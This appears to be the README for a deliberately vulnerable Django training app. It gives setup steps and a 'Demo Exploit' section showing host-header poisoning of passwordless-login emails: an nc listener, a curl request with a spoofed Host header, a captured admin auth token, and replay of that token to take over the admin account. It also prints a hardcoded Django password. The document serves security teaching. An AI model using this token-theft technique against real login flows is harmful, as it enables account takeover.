# Install

## External requirements
- a working mail server, and a correct django configuration
- for dev, it's an sqlite database, django support other backend
- Flag is configurable on settings.py
- Special group is configurable on settings.py

## Build

```
docker compose build
docker compose up -d
```

## Init

```
docker compose exec python ./manage.py migrate
docker compose exec python ./manage.py createsuperuser
```

Login to admin
- Create a special group, the name should be the one configured in settings.py
- Create at least one user and add it in the group
- Optionaly create a few user (normal, and staff) (locahost:8001/admin), add first_name, last_name and email

Then logout from the admin. (This is important, if not, you will be loggin on the wepapp as superadmin)

PASSWORD DJANGO
RGdadGGUQmuoCfGUX^ktU&voyuHhsy3!

## Demo Exploit

Launch a nc listner
```
nc -l -p 8082
```
Get a victim on the user directory page (http://localhost:8001/userdir)
Ask for a no pass login token, with and evil host and the victim mail
```
curl -H "Host: localhost:8002" http://localhost:8001/nopasslogin\?email\=special1@email.host
```

Wait for the admin to click on the no login link, and get the token, you will receive some data on the netcat shell, for exemple:
```
GET /nopasslogin?auth=YWRtaW5AYWRtaW4uaG9zdDoxcUJzeHM6ajRRcjliNkc2Z1BmRmNQRXVpVDkzQkItNzI4dVFSOG9TU0J4Z2k0MzhxVQ== HTTP/1.1
Host: localhost:8002
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.8 Chrome/87.0.4280.144 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: en-US,en;q=0.9
DNT: 1
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: search_parameters=%7B%22addresses%22%3A%22on%22%2C%22subnets%22%3A%22on%22%2C%22vlans%22%3A%22on%22%2C%22vrf%22%3A%22off%22%2C%22pstn%22%3A%22off%22%2C%22circuits%22%3A%22on%22%2C%22customers%22%3A%22off%22%7D; expandfolders=0; sstr=%7C18486%7C; csrftoken=sJzEIZxD90nlUl1a8CzCLVWwdZPru2qn
```

Now, you can use the auth param, with the correct host to login as the admin user, go to:
`http://localhost:8001/nopasslogin?auth=YWRtaW5AYWRtaW4uaG9zdDoxcUJzeHM6ajRRcjliNkc2Z1BmRmNQRXVpVDkzQkItNzI4dVFSOG9TU0J4Z2k0MzhxVQ==`

# Note

Any user in the special group will automaticly click on the link, you should ensure that the django code can reach the controlled target (in a docker, the localhost:8002 will not work)

For now, as a poc (/TODO):
- login and logout views are not handled correctly, login is accessible when you're already logged in for exemple
- dev deps are installed in the docker image
